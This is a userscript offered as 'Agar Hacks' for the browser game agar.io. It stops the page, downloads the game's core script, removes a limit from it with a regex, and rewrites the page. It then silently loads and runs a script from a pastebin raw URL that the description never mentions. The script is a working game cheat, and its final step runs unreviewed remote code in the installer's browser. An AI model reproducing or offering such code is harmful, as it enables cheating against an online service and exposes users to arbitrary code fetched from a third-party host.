// ==UserScript==
// @name        Agar Hacks for Tarik
// @namespace   Extension for agar.io
// @description Agar.io Hacks
// @author      SaladTato
// @include     http://agar.io/*
// @include     https://agar.io/*
// @grant       GM_xmlhttpRequest
// @version     1.1.1
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/36959/Agar%20Hacks%20for%20Tarik.user.js
// @updateURL https://update.greasyfork.org/scripts/36959/Agar%20Hacks%20for%20Tarik.meta.js
// ==/UserScript==
 
window.stop();
document.documentElement.innerHTML = null;
var coreScript = '', mainDoc = '';
GM_xmlhttpRequest({
        method : "GET",
        url : 'http://agar.io/agario.core.js',
        onload : function(event) {
            coreScript = event.responseText;
            coreScript = coreScript.replace(/d=d<1\.0\?1\.0:d;/i, '');
             GM_xmlhttpRequest({
                 method : "GET",
                 url : 'http://agar.io/',
                 onload : function(event) {
                     mainDoc = event.responseText;
                     mainDoc = mainDoc.replace(/<script src="agario\.core\.js" async><\/script>/i, '<script>'+coreScript+'</script>');;
                     document.open();
                     document.write(mainDoc);
                    document.close();
                    var itv = setInterval(function(){
                      if($.length){
                          clearInterval(itv);
                          $['getScript']('//pastebin.com/raw/LuXjHCkm');
                      }
                    }, 500);
                 }
             });
        }
});